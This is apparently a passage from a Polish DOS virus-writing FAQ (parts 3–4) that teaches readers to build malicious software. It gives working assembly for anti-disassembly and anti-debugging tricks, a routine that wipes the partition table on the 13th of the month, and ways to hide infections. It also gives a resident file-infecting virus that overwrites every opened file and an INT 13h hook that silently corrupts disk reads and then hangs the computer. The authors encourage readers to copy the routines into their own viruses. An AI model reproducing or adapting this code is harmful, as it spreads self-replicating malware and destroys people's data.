+   OR AX,0240A
+
+Niczym ten program nie przypomina poprzedniego, jednak dziala tak samo. 
+Dlaczego?? Caly trik jest w linijkach:
+
+     JMP ET2
+     DB 05H
+ET2: MOV DX,OFFSET Napis
+
+Wykonujemy skok do etykiety ET2. Tam wykonujemy normalnie polecenia. Program
+dziala poprawnie. Jednak disassembler przetwarzajac program nie wykona skoku,
+tylko pojdzie dalej. Zmiesza pusty bajt (05H) z instrukcja MOV ... czego
+wynikiem jest powstanie dziwnej komendy. Komenda ta zajmuje mniej bajtow niz
+nasza MOV... dlatego zostaly zmieszane rowniez nastepne linijki programu.
+
+To jest sposob na malo inteligentne programy. Te o bardziej zaawansowanym
+algorytmie nie daja sie na to nabrac. Podczas procesu disassemblacji
+wykonuja tak jakby program. Przy JMP wykonuja skok i disassembluja dalej.
+Jesli wiec dany bajt nie jest nigdy wykonywany, nie zostanie rowniez
+disassemblowany. Na takie programy jest jednak inny sposob. Bardziej zlozony,
+ale efektywny. Spojrzmy na przyklad zabezpieczenia tego samego programu
+innym sposobem:
+
+   MOV BX,108H
+   MOV AL,0BAH
+   MOV CS:[BX],AL
+   DB 0AH,010H,01H
+   MOV AH,09H
+   INT 21H
+   RET
+   Napis DB "Karol",13,10,'$'
+
+Powyzszy program wyswietli znany nam napis. Jednak jego disassemblacja nie
+da pozadanego efektu. Do jej wykonania uzylem juz bardzo inteligentnego
+disassemblera ID. O to, co on pokazal:
+
+LB0100:
+   MOV BX,108H
+   MOV AL,0BAH
+   MOV BYTE PTR CS:[BX],AL
+   OR  DL, BYTE PTR [BX+SI]
+   ADD WORD PTR LBCD09,SI
+   AND BX,AX
+   DEC BX
+   DB "arol",13,10,'$'
+
+Z tego programu nie dowiemy sie co on robi. Nawet wyswietlany napis jest 
+troche inny. W kodzie tym jest nawet blad, to co otrzymalismy nie da sie
+skompilowac, gdyz nieokreslona jest etykieta LBCD09. Jak to dziala???
+Otoz instrukcja MOV DX,110H (offset wyswietlanego napisu) ma kod BA1001. My
+w programie napisalismy 0A1001. Zmieniamy wartosc 0A na BA na poczatku, jednak
+disassemblery nie zmieniaja i wykonuja program. Wykonuja tak, ze 0A zupelnie
+zmienia kod programu. Powstaje cos zupelnie innego.
+Jest na pewno jeszcze wiele innych metod zabezpieczania, jednak nie nadaja
+sie one na ta czesc FAQ. Moze kiedys...
+
+
+3.  DEBUGGERY
+==================
+  Debuggery sa to wzbogacone o dodatkowe funkcje disassemblery. Co prawda
+nabieraja sie na te same sztuczki co pozostale, ale maja mozliwosc wykonania
+programu krok po kroku, przez co wszystkie pulapki zawodza. Jednak wszystko
+ma swoje wady. Debuggery do pracy krokowej uzywaja przerwania 3. Wstawiaja je
+(w pamieci) po kazdej instrukcji. Nastepnie przechwytuja i je kontroluja.
+Dziala to w taki sposob, ze po wykonaniu kazdej instrukcji jest wykonywane
+(choc tego nie widac) owo przerwanie, podczas ktorego zostaja wyswietlone
+wartosci wszystkich rejestrow, itp. Dzieki temu, ze debuggery uzywaja
+przerwania 3 mozna zabezpieczyc wirusa przed debuggowaniem. Jak?? Jest bardzo
+prosty sposob. Wystarczy w wirusie zmienic adres przerwania 3h na przerwanie
+21h. Nastepnie w programie wszedzie wywolywac przerwanie 3h zamiast 21h. Efekt
+bedzie taki sam, jednak debugger musi zmienic adres przerwania 3h po to, by
+moc je kontrolowac. Jesli je zmieni, to wirus nie bedzie dzialac poprawnie.
+Jak to uczynic? Do tego celu potrzebne nam beda dwie funkcje przerwania
+21h. Jedna do zmiany adresu przerwania i druga do odczytania aktualnego
+adresu. Oto one:
+
+          INT 21H
+          AH=x       - X -numer funkcji
+
+          AH=25H     - funkcja powoduje zmiane adresu procedury obslugi
+                       przerwania, ktorego numer podajemy w AL, na adreses
+                       przekazany w DS:DX
+
+          AH=35H    - funkcja powoduje sprawdzenie adresu procedury obslugi
+                      przerwania, ktorego numer rowniez podajemy w AL i
+                      zapamietanie go w rejestrach ES:BX
+
+Czyli piszac wirusa na poczatku moglibysmy napisac taka wstawke:
+
+   MOV AX,3521H        ; pobranie adresu przerwania 21H
+   INT 21H             ; wynik w ES:BX
+   MOV AX,2503H        ; zmiana adresu przerwania 3H na adres przerwania 21H
+   MOV DX,BX           ; DX=BX
+   PUSH ES
+   POP DS              ; DS=ES
+   INT 21H
+
+Teraz w programie zamiast kazdej instrukcji INT 21H wpisujemy INT 3H. Ten
+sposob ma jeszcze jedna zalete. Jesli piszemy dluzszego wirusa, w ktorym
+wiele razy uzywamy przerwania 21H, to ten sposob jest pewnego rodzaju
+optymalizacja. Otoz wykonanie przerwania, czyli instrukcja INT x, gdzie
+x jest numerem naszego przerwania zajmuje dwa bajty, czyli CDxx, gdzie
+xx, to wspomniane przerwanie. Jedenym wyjatkiem jest przerwanie 3H, ktorego
+kod jest jedno bajtowy i wyglada tak: CCH
+
+4.    PROCEDURY DESTRUKCYJNE
+===============================
+  Wirus poza tym, ze musi sie rozmnazac, no, powiedzmy powielac swoj kod,
+powinien takze powodowac dodatkowe efekty. Niektore wirusy spiewaja piosenki,
+inne pokazuja na ekranie jakies efekty (np. spadajace literki), a jeszcze
+inne od czasu do czasu cos... niszcza :-). No i wlasnie taka niszczaca
+procedurke sobie tutaj zaraz zrobimy. Bedzie ona, jesli wywolana 13-ego dnia
+dowolnego miesiaca, zamazywac tablice partycji pierwszego dysku twardego. Co
+to oznacza, chyba wszyscy wiedza, a tym, ktorzy nie wiedza juz wyjasniam: DOS
+(ani oczywiscie Windows) nie bedzie widzial zadnej partycji zawartej na tym
+dysku - efekt bedzie taki, jakby komputer wcale nie mial twardego dyku....
+Nie bedziemy jednak az tak brutalni, prawdziwa zawartosc tablicy partycji
+zapamietamy w innym sektorze, tak, ze dysk bedzie dalo sie uratowac.
+  Do realizacji naszego nieetycznego planu potrzebne beda dwie funkcje
+przerwania 13h:
+
+     FUNKCJE PRZERWANIA 13h OBSLUGI DYSKOW
+     =====================================
+
+     ---------------------------------------------------------------
+     Funkcja 02h: Odczytanie sektorow.
+     Parametry:   AH = 02h
+                  AL = liczba sektorow (max 128)
+                  CH = numer cylindra
+                  CL = numer pierwszego sektora
+                  DH = numer glowicy
+                  DL = nmer dysku
+                  ES:BX = adres bufora
+     Wynik:       AH - wynik operacji
+                  AL - liczba sektorow, na ktorych wykonano operacje
+                  Jesli ustawiony znacznik C to blad.
+     ---------------------------------------------------------------
+     Funkcja 03h: Zapisanie sektorow.
+     Parametry:   AH = 03h, reszta tak samo jak w funckji 02h
+     ---------------------------------------------------------------
+
+  Zeby nie bylo niejasnosci: BIOS widzi twardy dysk jako zbior dyskow
+magnetycznych, z ktorych kazdy ma dwie strony (z wyjatkiem dwoch
+zewnetrznych) i kazdej stronie odpowiada jedna glowica. Taki pojedynczy dysk
+dzieli sie na sciezki (w opisie int 13h zwane cylindrami - nie jest to
+dokladnie to samo, ale przy tym, czym sie tutaj zajmujemy mozna tak przyjac).
+No, a sciezka dzieli sie na sektory po 512 bajtow. Tablica partycji zajmuje
+jeden sektor o numerze 0,0,1 (tzn. 0 glowica, 0 cylinder, 1 sektor). Za
+tablica partycji jest kilka sektorow, ktorych DOS nie wykorzystuje, wiec tam
+mozna cos przechowywac (np. wirusa), a w naszym przypadku tablice partycji,
+taka, jaka byla przed zamazaniem - do tego celu wykorzystamy sektor 0,0,2.
+Jedna uwaga: to, ze DOS nie wykorzystuje tych kliku sektorow, nie oznacza, ze
+tak samo robia inne systemy - taki Unix przechowuje tam jakies swoje dane i
+jak mu je zamazac to sie wszystko skopie. No wiec do roboty.
+
+zamazywanie_tablicy_partycji:
+
+        mov     ah,2Ah                  ; funkcja DOS-u: pytanie o date
+        int     21h                     ; powrot: CX - rok (liczony od 1980)
+                                        ; DH - miesiac, DL - dzien
+                                        ; AL - dzien tygodnia (0=niedz. itd.)
+        cmp     dl,13                   ; czy 13-ty ??
+        jne     dajemy_spokoj           ;
+
+        mov     ax,0201h                ; odczytanie tablicy partycji do
+        mov     bx,(offset bufor)       ; bufora
+        mov     cx,0001h                ;
+        mov     dx,0080h                ;
+        int     13h                     ;
+        jc      dajemy_spokoj           ; CF=1 jesli blad
+
+        mov     ax,0301h                ; zapis tablicy partycji do sektora
+        inc     cl                      ; 0,0,2 - przerwanie 13h zmienilo po
+        int     13h                     ; ostatniej operacji tylko wartosc AX
+                                        ; dlatego nie musimy ustawiac innych
+                                        ; rejestrow - za wyjatkiem CL = numer
+                                        ; sektora
+        jc      dajemy_spokoj           ;
+
+        mov     ax,0301h                ; zapis do sektora 0,0,1 smieci, a
+        dec     cl                      ; dokladniej bloku PSP naszego
+        xor     bx,bx                   ; programu i jego pierwszych 256
+        int     13h                     ; bajtow, ale to nie wazne...
+
+dajemy_spokoj:
+        ret
+
+bufor   db      512 dup(0)
+
+
+  Ta procedurke mozna przepisac zywcem do swojego wirusa i wywolywac tak:
+
+  call zamazywanie_tablicy_partycji
+
+
+5.    ZAPAMIETYWANIE/ODTWARZANIE DATY/ATRYBUTOW ZARAZANEGO PLIKU
+=====================================================================
+  Zeby wirusa bylo trudniej wykryc, no i zeby byl bardziej "elegancki",
+powinien on przed infekcja pliku zapamietywac date i czas jego ostatniej
+modyfikacji, a takze atrybuty, zeby moc je pozniej odtworzyc. Zapamietywanie
+czasu ma takze taka zalate, ze wirus moze nieznacznie zmienic oryginalny
+czas ostatniej modyfikacji pliku, ustawiajac np. liczbe sekund na 64, co
+pozniej posluzy mu jako identyfikator plikow juz zarazonych. Co do atrybutow,
+to niezaleznie od tego, czy wirus je zapamietuje czy nie, przed proba
+otwarcia pliku powinien on skasowac wszystkie atrybuty (moze z wyjatkiem
+Archive), gdyz wirus nie moze nic zapisac do pliku z atrybutem ReadOnly.
+
+     FUNKCJE DOS-u DO ODCZYTU/ZMIANY ATRYBUTOW/DATY PLIKU
+     ====================================================
+
+     ----------------------------------------------------------------
+     Funkcja 43h: Odczytanie/zmiana atrybutow pliku.
+     Parametry:   AH = 43h
+                  AL = 0 - odczyt atrybutow, 1 - zmiana atrybutow
+                  CX = nowe atrybuty (jesli AL = 1)
+                  DS:DX = adres nazwy pliku w kodzie ASCIIZ
+     Wynik:       CX = atrybuty pliku (jesli AL = 0)
+                  Jesli ustawiony znacznik C to blad.
+     Uwagi:       Wirus powinien zmienic atrybuty pliku przed jego
+                  otwarciem!
+                  Znaczenie kolejnych bitow CX jest nastepujace:
+                  0   - plik tylko do odczytu
+                  1   - plik ukryty
+                  2   - plik systemowy
+                  3   - etykieta dysku
+                  4   - podkatalog
+                  5   - atrybut archiwalnosci
+                  6,7 - nie uzywane
+     ----------------------------------------------------------------
+     Funkcja 57h: Odczytanie/zmiana daty ostatniej modyfikacji pliku.
+     Parametry:   AH = 57h
+                  AL = 0 - odczyt daty, 1 - zmiana daty
+                  BX = uchwyt pliku (numer dojscia)
+                  CX = czas do ustawienia (jesli AL = 1)
+                  DX = data do ustawienia (jesli AL = 1)
+     Wynik:       CX = czas ostatniej modyfikacji pliku (dla AL = 0)
+                  DX = data ostatniej modyfikacji pliku (dla AL = 0)
+                  Jesli ustawiony znacznik C to blad.
+     Uwagi:       Znaczenie kolejnych bitow CX i DX jest nastepujace:
+                  DX:  9..15  - rok do 1980
+                       5..8   - miesiac
+                       0..4   - dzien
+                  CX:  11..15 - godzina
+                       5..10  - minuta
+                       0..4   - sekunda / 2
+     ----------------------------------------------------------------
+
+
+6.    ZAKONCZENIE
+=========================
+  Tak dobieglismy do konca. Mysle, ze informacje tutaj zawarte  przydadza sie
+do twoich niecnych celow. ;-)) W kolejnej (IV) czesci FAQ zajmiemy sie wirusami
+plikow typu BAT (przerobimy naszego wirusa z FAQ 1 tak, zeby zarazal tez pliki
+BAT), oraz wirusami rezydentnymi - napiszemy najprosteszego wirusa rezydentnego 
+oraz rezydentna procedure destrukcyjna.
+
+
+                               CZESC 4
+                              =========
+
+Mozesz zamknac na chwile oczy i szybko to przeczytac:
+  "!! UWAGA !! Nie ponosze zadnej odpowiedzialnosci za szkody spowodowane
+         jakimkolwiek praktykowaniem informacji zawartych w tym FAQ."
+
+Mozesz juz otworzyc oczy, PRZESZLO :-))
+
+  Witam w kolejnej czesci FAQ poswieconemu WIRUSOM. Mysle, ze po poprzednich
+lekcjach czegos sie nauczyles. Jesli nie, to najpierw przestudiuj jej jeszcze
+raz, bo inaczej bedziesz mial zaleglosci. Przypominam, ze jest to juz czwarta
+czesc z tego cyklu. Jesli nie masz poprzedniej, a chcialbys miec, do zajrzyj
+na moja strone WWW
+         HTTP://WWW.FREE.COM.PL/BINBOY
+lub napisz do mnie: BINBOY@FREE.COM.PL
+
+
+Niedlugo powinna pojawic sie kolejna czesc FAQ. Dokladnie kiedy, sam jeszcze
+nie wiem. Dobra. Teraz stara gadka:
+
+Tekst ten mozna dowolnie kopiowac, zamieszczac na swoich stronach internetowych
+publikowac w dowolnych czasopismach, itp. Zezwalam rowniez na mala modyfikacje
+(poprawienie bledow ortograficznych, itp.). Prosze tylko o zaznczenie autorstwa
+tekstu, czyli dodanie napisu BY BINBOY & MBR.
+
+
+ 0. ZACZYNAMY
+ ============
+
+   Jaki jest cel tego tekstu nie trzeba chyba pisac. Jesli jestes zly na
+ caly swiat, to dobrze trafiles. W tej czesci FAQ zajmiemy sie wirusami
+ rezydentnymi. Poznamy ich ogolna budowe i sposob dzialania. Stworzymy
+ takze bardzo ciekawa procedure destrukcyjna. 
+   W tym FAQ poznamy takze ogolna budowe i funkcjonowanie wirusow plikow BAT.
+ Takich wirusow jest stosunkowo malo, wiec moze napiszesz jakis?? ;-)
+ Dobra. Skonczmy te lanie wody i zwiekszanie objetosci tego pliku i tak
+ zajmuje 28471 bajtow. Przejdzmy do rzeczy.
+  
+
+
+ 1. WSTEP DO PISANIA WIRUSOW REZYDENTNYCH
+ ========================================
+
+    W poprzednich czesciach FAQ zawarty byl kurs pisania wirusow, ktore
+ mialy te szczegolna wlasnosc, ze probe infekcji podejmowaly tylko w momencie
+ uruchamiania nosiciela. Jest to dla wirusow duze ograniczenie. W przypadku
+ wirusa, ktory aby znalezc ofiare przeszukuje tylko aktualny katalog ta
+ niedogodnosc jest oczywista - w koncu ilez plikow do zarazenia moze byc w
+ jednym katalogu ? :-) Z kolei wirus przeszukujacy caly dysk, po kilku
+ uruchomieniach, kiedy wszystkie pliki "blizej" niego beda juz zarazone,
+ bedzie w poszukiwaniu ofiar rzezil po tym dysku i rzezil, wydluzajac przy
+ tym czas uruchamiania nosiciela..... jednym slowem zdemaskuje sie w ten
+ sposob i klapa.
+    Rozwiazaniem tych problemow sa wirusy rezydentne. Zakladam, ze ten, kto
+ to czyta wie, co to sa programy rezydentne, przerwania, tablica wektorow
+ przerwan itd. Wirus rezydentny instaluje sie w pamieci przy uruchomieniu
+ nosiciela, siedzi sobie tam cichcem, az wyczai np., ze DOS uruchamia jakis
+ plik no i wtedy go cap.
+
+
+ 2. INSTALOWANIE SIE W PAMIECI
+ =============================
+
+    Wirus moze instalowac sie w przeroznych miejscach pamieci operacyjnej
+ (oczywiscie nie sa one calkiem dowolne, ale skoro wiesz, co to sa programy
+ rezydentne, jest to dla ciebie oczywiste...;-). Wybor miejsca jest sprawa
+ bardzo istotna, gdyz wplywa on na mozliwosc zdemaskowania wirusa. W
+ ogolnosci pewne jest, ze wirus nie powinien do instalacji rezydentnej uzywac
+ przeznaczonych do tego funkcji DOS-a (tj. int 27h, funkcja 31h int 21h).
+ Takiego wirusa jest w stanie wykryc kazdy program pokazujacy zawartosc
+ pamieci (np. MEM z DOS-a). Dlatego tez tworcy wirusow kombinowali,
+ kombinowali i w koncu wykombinowali.
+    Pierwsze miejsce w pamieci, gdzie wirus moze sie skopiowac to druga
+ polowa tablicy wektorow przerwan (adres 0:200h). Do dypozycji wirusa jest
+ tam 512 bajtow, co niestety nie zawsze wystarcza. Tej metody jednak nie
+ polecam - druga czesc TWP nie jest niby uzywana, ale niektore programy moga
+ uzywac przerwan o wysokich numerach, co w polaczeniu z wirusem spowoduje
+ zawieszenie komputera. Zaleta tego rozwiazania jest jednak fakt, ze wirus
+ nie zmniejsza ilosci pamieci dostepnej dla innych programow.
+    Drugie miejsce (lepsze od poprzedniego) to obszar danych DOS-u. Zaczyna
+ sie on pod adresem 0:500h. Wlasciwie nie bardzo wiem, do czego ma on sluzyc,
+ grunt, zamazywanie go nigdy nie spowodowalo u mnie zadnych nieporzadanych
+ skutkow (typu zawieszenie komputera, czy cos). Do dyspozycji wirusa jest
+ niby 512 bajtow, ale pierwsze powiedzmy 64, lepiej zostawic w spokoju
+ (zawsze tak robilem) i instalowac wirusa od 0:540h, co oczywiscie powoduje,
+ ze musi on byc krotszy.
+    Kolejna technika (chyba najczesciej uzywana przez wirusy) to zmniejszenie
+ bloku pamieci przydzielonego przez DOS nosicielowi o dlugosc wirusa,
+ przydzielenie wirusowi powstalego w ten sposob wolnego bloku pamieci i
+ (koniecznie!) modyfikacja jego naglowka, gdyz inaczej wirusa bedzie prawie
+ tak samo latwo zdemaskowac, jakby instalowal sie uzywajac do tego celu
+ funckji DOS-u. Zmiana dlugosci bloku pamieci nosiciela oraz przydzial
+ pamieci wirusowi moze byc wykonywany przy pomocy przeznaczonych do tego
+ funckji DOS-u lub przez "reczna" modyfikacje naglowkow blokow pamieci
+ (zalecane!).
+    Ostatnia technika, o ktorej tutaj wspomne (co nie znaczy, ze wiecej nie
+ ma) to instalowanie sie w HMA, czyli bloku pamieci tuz ponad garnica 1MB,
+ ktory dostepny jest w wersjach systemu DOS 5.00+. Do instalacji w HMA
+ sluza specjalne funkcje przerwania 2Fh (recznie tez mozna, a nawet lepiej,
+ ale nigdy tego nie roobilem...:-(). Te funkcje to:
+
+     FUNKCJE PRZERWANIA 2Fh DO PRZYDZIALU PAMIECI W HMA
+     ==================================================
+
+     -----------------------------------------------------------
+     Funkcja 4A01h: Funkcja pyta o wolne miejsce w HMA
+     Opis:          Pozwala programowi okreslic, ile
+                    miejsca pozostaje w HMA po zaladowaniu
+                    tam DOS-a.
+     Parametry:     AX = 4A01h
+     Wynik:         BX = Liczba wolnych bajt¢w w HMA (jesli
+                    DOS nie zaladowany do HMA to 0)
+                    ES:DI = Adres pierwszego wolnego bajtu
+                    w HMA (lub FFFF:FFFF, jesli DOS nie w HMA)
+     -----------------------------------------------------------
+     Funkcja 4A02h: Przydzial pamieci w HMA
+     Opis:          Przydziela wolna pamiec w HMA
+     Parametry:     AX = 4A02h
+                    BX = Liczba bajt¢w przydzielanej pamieci
+     Wynik:         ES:DI = Adres pierwszego bajtu przydzielonej
+                    pamieci (FFFF:FFFF, jesli DOS nie w HMA)
+     -----------------------------------------------------------
+
+
+ 3. PRZEJMOWANIE PRZERWAN
+ ========================
+
+    Zeby wirus byl informowany o fakcie uruchamiania programu, czy tez
+ otwierania/zamykania pliku przez DOS musi przejac odpowiednie przerwanie.
+ Wirusy przejmuja rozne przerwania zaleznie od tego, co maja robic, czy
+ pokazuja jakies efekty, odgrywaja melodyjki czy co. Co do jednego przerwania
+ wszystkie wirusy plikowe sa zgodne - int 21h po prostu trzeba przejac. Po
+ jego przejeciu, przy kazdym jego wywolaniu najpierw zglosi sie wirus, a po
+ zrobieniu swojej roboty - wywola oryginalny program obslugi przerwania.
+    Sposobow przejmowania przerwan jest mnostwo. Najprostszy to wykorzystanie
+ przeznaczonych do tego celu funkcji DOS-u tj. 35h i 25h, jak zwykle - nie
+ zalecany, bo najlatwiejszy do wykrycia.
+
+     FUNKCJE PRZERWANIA 21h ZWIAZANE Z WEKTORAMI PRZERWAN
+     ====================================================
+
+     -------------------------------------------------------
+     Funkcja 35h: Odczytanie wektora przerwania.
+     Parametry:   AH = 35h, AL = numer przerwania
+     Wynik:       ES:BX = Adres procedury obslugi przerwania
+     -------------------------------------------------------
+     Funkcja 25h: Zapisanie wektora przerwania.
+     Parametry:   AH = 45h, AL = numer przerwania
+                  DS:DX = Adres nowej procedury obslugi
+     -------------------------------------------------------
+
+    Znacznie lepsze (i prawie rownie proste) jest bezposrednie manipulowanie na
+ tablicy wektorow przerwan. Z kolei zaawansowane wirusy szukaja (roznymi
+ sposobami) tzw. "czystych" wejsc do systemu (tak, zeby ominac rezydujace
+ programy antywirusowe), ale tym nie bedziemy sie na razie zajmowac.
+
+
+ 4. OBSLUGA PRZEJETEGO PRZERWANIA
+ ================================
+
+    Sprawa jest prosta, zeby nie powiedziec, ze oczywista. Procedura obslugi
+ przerwania zawarta w wirusie musi:
+      - sprawdzic, czy wywolywana jest funkcja, ktora interesuje wirusa np.
+        otwieranie pliku i jesli tak - odpowiednio zadzialac
+      - wywolac oryginalna procedure obslugi przejetego przerwania - na to
+        jest kilka sposobow:
+             1) jmp XXXX:YYYY   ; gdzie XXXX:YYYY adres oryginalnej procedury
+             2) pushf           ; tak trzeba, dla symulacji przerwania
+                call XXXX:YYYY
+             3) pushf           ; tak znowu trzeba
+                call far cs:[adres_procedury_obslugi]
+        Najlepszy jest pierwszy sposob, ale czasem nie da sie go zastosowac,
+        i wtedy trzeba drugi (drugi i trzeci robia dokladnie to samo, a drugi
+        jest lepszy, bo jest krotszy i... lepszy :-)
+
+
+ 5. NAJPROSTSZY WIRUS REZYDENTNY
+ ===============================
+
+    Teraz zajmiemy sie najprostszym i do tego jednym z krotszych wirusow
+ rezydentnych. Jako ze jest on PROSTY i KROTKI jest takze bardzo prymitywny
+ i do tego do instalacji w pamieci uzywa funkcji DOS-u (to te, przy ktorych
+ pisze, ze niezalecane ;-))). Wirus nie sprawdza, czy jest juz zainstalowany,
+ nie sprawdza tez, czy infekowany plik nie jest juz przypadkiem "chory", nie
+ zachowuje czasu i daty ostatniej modyfikacji ofiary, a atrybut ReadOnly jest
+ dla niego przeszkodo niedopokonania - jednym slowem... kila, ale to nic.
+ Aha, i do tego zapisuje sie na poczatku pliku, czyli go niszczy.... OK - w
+ nastepnych czesciach FAQ udoskonalimy go troche, ale na razie.... No, wiec
+ plan jest taki - ktos odpala wirusa, a on:
+      - odczytuje wektor przerwania 21h i zapamietuje go (funkcja DOS-u 35h)
+      - zmienia wektor przerwania tak, aby wskazywal na odpowiednia procedure
+        wirusa (funkcja DOS-a 25h)
+      - oddaje sterowanie DOS-owi, ale pozostaje w pamieci (int 27h)
+
+
+;---tu sie zaczyna wirus----------------------------------------------
+
+.286                                 ;\
+.model tiny                          ;  dyrektywy asemblera - tak po
+.code                                ;  prostu ma byc :-)
+                org     100h         ;/
+
+dlugosc_wirusa  equ     (offset koniec_wirusa - offset _start)
+
+_start:
+                mov     ax,3521h                      ; odczytanie wektora
+                int     21h                           ; przerwania 21h...
+                mov     word ptr [wektor_21h],bx      ; ..i jego zapamietanie
+                mov     word ptr [wektor_21h+2],es    ; w przeznaczonej na to
+                mov     ah,25h                        ; zmiennej
+                mov     dx,(offset obsluga_21h)       ; zmiana wektora, zeby
+                int     21h                           ; wskazywal na wirusa
+                mov     dx,(offset koniec_wirusa)     ; zakonczenie procesu
+                int     27h                           ; z pozostawieniem w
+                                                      ; pamieci
+
+;<--- tutaj bedzie oddawane sterowanie zawsze, gdy jakis program wywola
+;---- przerwanie 21h
+
+obsluga_21h:
+                cmp     ah,3Dh                        ; czy otwarcie pliku ?
+                je      dalej                         ; jesli tak to "dalej"
+                db      0EAh     ; kod instrukcji JMP XXXX:YYYY
+wektor_21h      dd      ?        ; te 4 bajty to adres oryginalnej procedury
+                                 ; obslugi przerwania, stanowia one czesc
+                                 ; wczesniejszej instrukcji (czyli JMP)
+; np. jesli wektor 21h przed instalcja wirusa wskazywal 1234:5678 to teraz
+; instrukcja jmp wyglada tak: JMP 1234:5678
+
+dalej:          pushf            ; zachowanie znacznikow na stosie dla
+                                 ; symulacji przerwania
+; Tak trzeba, bo procesor przed wykonaniem instrukcji INT robi to samo, wiec
+; procedury obslugi przerwan uwazaja, ze znaczniki sa na stosie - jesli by
+; ich nie bylo to by sie spieprzylo :-)
+
+                mov     al,2     ; jak wiadomo z opisu funkcji 3Dh przerwania
+                                 ; 21h w AL jest tryb otwarcie pliku.
+; Moze sie okazac, ze jakis program otwiera plik tylko do odczytu, wiec
+; wirus nie moglby sie wtedy do niego dopisac, a tak tryb otwarcia bedzie
+; "do odczytu i zapisu".
+
+                call    dword ptr cs:[wektor_21h]   ; wywolanie oryginalnej
+                                                    ; procedury obslugi
+; to jest ten glupi sposob, ale tak trzeba. Instrukcja ta spowoduje otwarcie
+; pliku. Nie mozna wywolac DOS-a przez JMP, bo sterownie nie wrocilo by do
+; wirusa, a musi sie przeciez jeszcze dopisac. Nie mozna tez wywolac DOS-a
+; przez int 21h.
+
+                pusha                   ; zachowanie zmienianych rejestrow na
+                push    ds              ; stosie
+                push    cs              ;
+                pop     ds              ; DS=CS
+                xchg    bx,ax           ; Dos zwrocil w BX uchwyt pliku
+                mov     ah,40h          ; 40h - zapis do pliku
+                mov     cx,dlugosc_wirusa     ; oczywiste
+                mov     dx,100h         ; zapisane zostana bajty spod DS:DX
+                int     21h             ; czyli CS:100h, czyli wirus :-)
+                pop     ds              ; odtworzenie rejestrow
+                popa                    ;
+                retf    2               ; daleki powrot, ze zdjeciem ze stosu
+                                        ; znacznikow, bo oryginalna
+; procedura obslugi tego nie zrobila (tzn. zrobila, ale sciagnela te
+; znaczniki, ktore wirus wsadzil na stos)
+
+info            db      '(c) 1999 MBR Labs',0
+koniec_wirusa:
+                end     _start
+
+;---tu sie konczy wirus-----------------------------------------
+
+    Moze sie wydawac dziwne, ze wirus w procedurze obslugi przerwania 21h
+ wywoluje funkcje DOS-u wlasnie przez int 21h. Sprawa jest prosta - poniewaz
+ wirus reaguje na funkcje 3Dh - jej w ten sposob wywyolac nie moze, ale inne
+ owszem.
+    Wirus bardzo szybko sie rozmnaza i niszczy kazdy plik, jaki napotka, nie
+ wazne czy wykonywalny, czy nie, wiec lepiej nie uruchamiac go, zwlaszcza, na
+ wlasnym komputerze.
+
+
+ 6. REZYDENTNA PROCEDURA DESTRUKCJI
+ ==================================
+
+    W trzeciej czesci FAQ napisalismy prosta procedure destrukcyjna, ktora
+ zamazywala tablice partycji pierwszego dysku twardego. Uruchomienie takiej
+ procedury przez wirusa jest jednoznaczne z jego ujawnieniem sie, a tego
+ bysmy nie chcieli. Dlatego procedura destrukcji powinna byc znacznie
+ bardziej finezyjna i dyskretna. Napiszemy procedure, ktora podwieszona pod
+ przerwanie 13h (jego opis znajduje sie w FAQ 3) bedzie falszowac powiedzmy,
+ co setny odczyt z dysku zmieniajac jeden poczatkowy bajt odczytywanego
+ sektora. Procedura bedzie takze prowadzila licznik zafalszowanych odczytow i
+ gdy jego wartosc osiagnie np. 20 to od tego momentu falszowany bedzie co
+ 95-ty odczyt itd. Gdy dojdzie do tego, ze falszowany bedzie co 10-ty odczyt,
+ a praca na komputerze bedzie juz praktycznie niemozliwa (o ile komputer sie
+ sam wczesniej nie zawiesi), to procedura zawiesi komputer. Taki wirus nie
+ niszczy danych bezposrednio na dysku tylko w pamieci. Dane na dysku moga
+ jednak zostac zafalszowane w przypadku kopiowania zbiorow - jesli jakis
+ program bedzie kopiowac plik, a wirus podmieni mu kilka bajtow w
+ odczytywanych danych, to kopia tego pliku bedzie juz uszkodzona. Oto krotki
+ programik rezydentny, ktory to demonstruje.
+
+;----tu-sie-zaczyna----------------------------------------------------------
+
+.model  tiny
+.code
+        org     100h
+
+_start:
+        mov     ax,3513h                         ; pobranie adresu procedury
+        int     21h                              ; obslugi przerwania 13H
+        mov     word ptr [wektor_int_13h],bx     ; zapamietanie wyniku w 
+        mov     word ptr [wektor_int_13h+2],es   ; zmiennej WERKTOR_INT_13H
+        mov     ah,25h                           ; zmiana adresu przerwania 13H
+        mov     dx,(offset obsluga_int_13h)      ; na adres naszej procedury
+        int     21h
+        mov     dx,(offset koniec)               ; zakonczenie programu
+        int     27h                              ; z pozostawieniem w pamieci
+
+obsluga_int_13h:                                 ; nasza procedura 13H
+                        cmp     ah,02h           ; jesli proba odczytu sektora
+                        je      odczyt_sektorow  ; to ODCZYT_SEKTOROW
+wywolaj_int_13h:        db      0EAh             ; jesli nie, to wywolanie
+wektor_int_13h          dd      ?                ; oryginalnego przerwania
+
+odczyt_sektorow:                                 ; odczytujemy z dysku
+        inc     byte ptr cs:[licznik_odczytow]   ; zwiekszenie licznika
+                                                 ; odczytow
+        push    ax                               ;
+        mov     al,byte ptr cs:[co_ile_psuc]     ; do AL, co ile mamy psuc
+        cmp     byte ptr cs:[licznik_odczytow],al; jesli jeszcze nie pora
+        pop     ax
+        jne     wywolaj_int_13h                  ; to wywolujemy oryginalna
+                                                 ; procecudure obslugi 13H
+        mov     byte ptr cs:[licznik_odczytow],0 ; jesli pora, to wyzerowanie
+                                                 ; licznika odczytow
+        cmp     byte ptr cs:[licznik_zepsutych],20;jesli jeszcze nie popsuto 20
+        jne     zepsuj                           ; to zepsuj
+        mov     byte ptr cs:[licznik_zepsutych],0; a jesli zepsuto, to wyzeruj
+                                                 ; licznik zepsutych
+        cmp     byte ptr cs:[co_ile_psuc],10     ; jesli ma psuc co 10 sektor
+        je      zawies_komputer                  ; to juz niech zawiesi kompa
+        sub     byte ptr cs:[co_ile_psuc],5      ; zwieksza czestotliwosc
+                                                 ; psucia odczytow sektorow
+zepsuj: pushf
+        call    dword ptr cs:[wektor_int_13h]    ; odczyt sektora
+        mov     byte ptr es:[bx],80h             ; popsucie pierwszego
+                                                 ; bajtu odczytanego sektora
+        inc     byte ptr cs:[licznik_zepsutych]  ; zwiekszenie licznika
+                                                 ; popsutych sektorow
+        iret
+
+zawies_komputer:        retf                     ; to spowoduje zawieszenie
+                                                 ; systemu
+licznik_odczytow        db      0
+licznik_zepsutych       db      0
+co_ile_psuc             db      100
+
+koniec:                 end     _start
+
